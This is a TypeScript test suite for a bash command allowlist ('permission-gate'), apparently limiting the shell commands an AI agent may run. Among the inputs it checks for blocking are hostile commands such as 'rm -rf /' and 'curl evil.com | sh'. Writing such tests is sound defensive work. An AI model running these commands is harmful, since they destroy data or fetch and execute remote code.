/**
 * Tests for permission-gate extension
 * Run: npm test
 */

import { describe, it } from "node:test";
import assert from "node:assert";
import { isSafeBashCommand } from "../extensions/permission-gate.ts";

describe("Permission Gate - Bash Command Safety", () => {
    it("allows safe read-only commands", () => {
        const safeCommands = [
            "ls -la",
            "cat file.txt",
            "cd /some/directory",
            "grep pattern file.txt",
            "find . -name '*.ts'",
            "git status",
            "git log",
            "gh repo view",
            "pwd",
            "echo hello",
            "which node",
        ];

        for (const cmd of safeCommands) {
            assert.strictEqual(isSafeBashCommand(cmd), true, `Expected "${cmd}" to be safe`);
        }
    });

    it("blocks unsafe commands", () => {
        const unsafeCommands = [
            "rm -rf /",
            "echo $(whoami)", // Command substitution
            "ls > output.txt", // File redirect
            "curl evil.com | sh", // sh not in whitelist
            "cat file.txt < input.txt", // Input redirect
            "git commit -m 'test'", // commit not in safe subcommands
            "mv file1 file2", // mv not whitelisted
        ];

        for (const cmd of unsafeCommands) {
            assert.strictEqual(isSafeBashCommand(cmd), false, `Expected "${cmd}" to be unsafe`);
        }
    });

    it("allows safe pipes between whitelisted commands", () => {
        const safePipes = [
            "cat file.txt | grep test",
            "ls | grep .ts",
            "git log | head -n 10",
            "find . -name '*.ts' | wc -l",
        ];

        for (const cmd of safePipes) {
            assert.strictEqual(isSafeBashCommand(cmd), true, `Expected "${cmd}" to be safe`);
        }
    });

    it("allows safe compound commands with logical operators", () => {
        const safeCompoundCommands = [
            "cd /tmp && ls",
            "cd /Users/balu/Code && git log",
            "pwd && echo hello",
        ];

        for (const cmd of safeCompoundCommands) {
            assert.strictEqual(isSafeBashCommand(cmd), true, `Expected "${cmd}" to be safe`);
        }
    });

    it("strips /dev/null redirects before checking", () => {
        const safeWithDevNull = [
            "cat file.txt 2>/dev/null",
            "ls 2>/dev/null",
            "git status 2>&1 >/dev/null",
            "find . -name test 2>/dev/null",
        ];

        for (const cmd of safeWithDevNull) {
            assert.strictEqual(isSafeBashCommand(cmd), true, `Expected "${cmd}" to be safe after stripping /dev/null`);
        }
    });

    it("allows GitHub CLI commands with safe resource and action", () => {
        const safeGhCommands = [
            "gh repo view",
            "gh pr list",
            "gh issue show",
            "gh run watch",
            "gh --version",
        ];

        for (const cmd of safeGhCommands) {
            assert.strictEqual(isSafeBashCommand(cmd), true, `Expected "${cmd}" to be safe`);
        }
    });

    it("blocks GitHub CLI commands with unsafe actions", () => {
        const unsafeGhCommands = [
            "gh repo delete", // delete not in safeGhActions
            "gh pr merge", // merge not in safeGhActions
        ];

        for (const cmd of unsafeGhCommands) {
            assert.strictEqual(isSafeBashCommand(cmd), false, `Expected "${cmd}" to be unsafe`);
        }
    });

    it("blocks commands with dangerous shell features", () => {
        const dangerousCommands = [
            "ls `whoami`", // Backtick substitution
            "echo $HOME", // Variable expansion
            "echo ${USER}", // Variable expansion
            "ls (whoami)", // Subshell
            "ls {a,b,c}", // Brace expansion
        ];

        for (const cmd of dangerousCommands) {
            assert.strictEqual(isSafeBashCommand(cmd), false, `Expected "${cmd}" to be unsafe`);
        }
    });

    it("allows dangerous characters when properly quoted", () => {
        const safeQuotedCommands = [
            'grep "OpenAICompletionsCompat {" file.ts', // Quoted brace
            "grep 'pattern {' file.txt", // Single-quoted brace
            'echo "redirect > file"', // Quoted redirect
            'cat "file$name.txt"', // Quoted variable expansion
            "echo 'subshell (test)'", // Quoted parenthesis
            'grep "backtick `test`"', // Quoted backtick
        ];

        for (const cmd of safeQuotedCommands) {
            assert.strictEqual(isSafeBashCommand(cmd), true, `Expected "${cmd}" to be safe (quoted)`);
        }
    });

    it("handles escaped characters correctly", () => {
        const escapedCommands = [
            "echo \\{", // Escaped brace
            "echo \\$HOME", // Escaped variable
            "grep \\> file.txt", // Escaped redirect
        ];

        for (const cmd of escapedCommands) {
            assert.strictEqual(isSafeBashCommand(cmd), true, `Expected "${cmd}" to be safe (escaped)`);
        }
    });

    it("handles mixed quotes correctly", () => {
        const mixedQuoteCommands = [
            'grep "pattern \'nested\'" file.txt', // Double quotes with single inside
            "grep 'pattern \"nested\"' file.txt", // Single quotes with double inside
        ];

        for (const cmd of mixedQuoteCommands) {
            assert.strictEqual(isSafeBashCommand(cmd), true, `Expected "${cmd}" to be safe (mixed quotes)`);
        }
    });

    it("allows ktools commands with safe tool and action", () => {
        const safeKtoolsCommands = [
            "ktools yt-transcript list dQw4w9WgXcQ",
            "ktools yt-transcript chapters dQw4w9WgXcQ",
            "ktools yt-transcript get dQw4w9WgXcQ --output /path/to/file.txt",
        ];

        for (const cmd of safeKtoolsCommands) {
            assert.strictEqual(isSafeBashCommand(cmd), true, `Expected "${cmd}" to be safe`);
        }
    });

    it("blocks ktools commands with unsafe actions or tools", () => {
        const unsafeKtoolsCommands = [
            "ktools yt-transcript delete dQw4w9WgXcQ", // delete not in safeKtoolsActions
            "ktools unknown-tool list dQw4w9WgXcQ", // unknown-tool not in safeKtoolsTools
        ];

        for (const cmd of unsafeKtoolsCommands) {
            assert.strictEqual(isSafeBashCommand(cmd), false, `Expected "${cmd}" to be unsafe`);
        }
    });

    it("allows xargs with safe commands", () => {
        const safeXargsCommands = [
            "xargs grep pattern",
            "xargs ls -la",
            "xargs cat",
            "xargs -n 1 head",
            "xargs -0 grep search", 
            "xargs -p find . -name",
            "xargs git status",
        ];

        for (const cmd of safeXargsCommands) {
            assert.strictEqual(isSafeBashCommand(cmd), true, `Expected "${cmd}" to be safe`);
        }
    });

    it("blocks xargs with unsafe commands", () => {
        const unsafeXargsCommands = [
            "xargs rm", // rm is not safe
            "xargs mv file1 file2", // mv is not safe
            "xargs sh -c", // sh is not safe
            "xargs git commit", // commit is not in safe git subcommands
        ];

        for (const cmd of unsafeXargsCommands) {
            assert.strictEqual(isSafeBashCommand(cmd), false, `Expected "${cmd}" to be unsafe`);
        }
    });

    it("blocks xargs with malformed or missing commands", () => {
        const malformedXargsCommands = [
            "xargs", // No command
            "xargs -I", // Missing replacement string  
            "xargs -n", // Missing number argument
            "xargs -I replacement-string", // No command after flags
        ];

        for (const cmd of malformedXargsCommands) {
            assert.strictEqual(isSafeBashCommand(cmd), false, `Expected "${cmd}" to be unsafe (malformed)`);
        }
    });

    it("handles quoted strings containing shell operators correctly", () => {
        const commandsWithQuotedOperators = [
            'grep "pattern|with|pipes" file.txt',
            'echo "command; another" | cat',
            'find . -name "*.md" | xargs grep -l -i "bundle\\|shade\\|conflict"',
            'xargs grep -i "search|term"',
            'ls | grep "file;name"',
            'cat file.txt | grep "text&more"',
        ];

        for (const cmd of commandsWithQuotedOperators) {
            assert.strictEqual(isSafeBashCommand(cmd), true, `Expected "${cmd}" to be safe (quoted operators)`);
        }
    });

    it("correctly splits commands with quoted shell operators", () => {
        const complexCommands = [
            'echo "a|b" | grep test', // Should split into: echo "a|b", grep test
            'find . | xargs grep "pattern;with;semicolons"', // Should split into: find ., xargs grep "pattern;with;semicolons"
            'ls ; echo "done&finished"', // Should split into: ls, echo "done&finished"
        ];

        for (const cmd of complexCommands) {
            assert.strictEqual(isSafeBashCommand(cmd), true, `Expected "${cmd}" to be safe (complex quoted)`);
        }
    });

    it("handles the specific parquet-java command that was previously failing", () => {
        // This was the exact command that prompted the quote-aware splitting fix
        const parquetCommand = 'find . -name "*.md" | xargs grep -l -i "bundle\\|shade\\|conflict"';
        assert.strictEqual(
            isSafeBashCommand(parquetCommand), 
            true, 
            "The parquet-java command should be allowed (regression test)"
        );
    });
});
